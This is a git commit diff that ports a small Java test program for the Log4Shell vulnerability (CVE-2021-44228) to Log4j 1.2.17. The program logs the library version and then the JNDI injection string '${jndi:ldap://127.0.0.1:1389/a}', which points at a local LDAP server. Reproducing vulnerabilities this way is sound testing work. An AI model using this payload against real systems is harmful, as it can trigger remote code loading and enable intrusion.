be74d1677e776e58dc1d1b0133d8e8eba81dbd6f
nyamakawa <nyamakawa2@gmail.com>
2021-12-10 23:31:16 +0900

    Add Log4j 1.2.17 ver of CVE-2021-44228

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -1,11 +1,12 @@
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-
+import org.apache.log4j.Logger;
+import org.apache.log4j.LogManager;
+import org.apache.log4j.PropertyConfigurator;
 
 public class log4j {
-    private static final Logger logger = LogManager.getLogger(log4j.class);
+    private static final Logger logger = Logger.getLogger(log4j.class.getName());
 
     public static void main(String[] args) {
+        PropertyConfigurator.configure("log4j.properties");
         logger.error(LogManager.class.getPackage().getImplementationVersion());
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
     }
